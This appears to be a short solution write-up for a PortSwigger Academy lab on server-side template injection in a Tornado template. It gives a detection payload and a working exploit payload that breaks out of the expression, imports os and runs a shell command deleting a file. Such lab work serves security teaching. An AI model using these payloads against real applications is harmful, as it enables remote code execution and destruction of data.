# Lab 02 — Basic server-side template injection (code context)

> **Apprentice** · [Official lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

**Entry point:** `POST /my-account/change-blog-post-author-display` — the
value is embedded **inside an existing expression** of a Tornado template.

## Solution

1. The display name is placed into code like
   `{{blog-post-author-display}}`-adjacent expressions — close the expression
   with `}}` to break out.
2. Detect — set the display name to:

```
user.name}}{{7*7}}
```

Reload a page with your comments: name shows `Peter Wiener49}}` — SSTI.

3. Exploit — Tornado's `{% %}` blocks run Python; import `os` and call
   `system()`:

```
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

4. Send the change-request, then **reload the blog page** with your comment —
   the template renders and the file is deleted — lab solved.

## Notes

"Code context" = your input lands inside an already-open expression, so the
first `}}` is the breakout key.
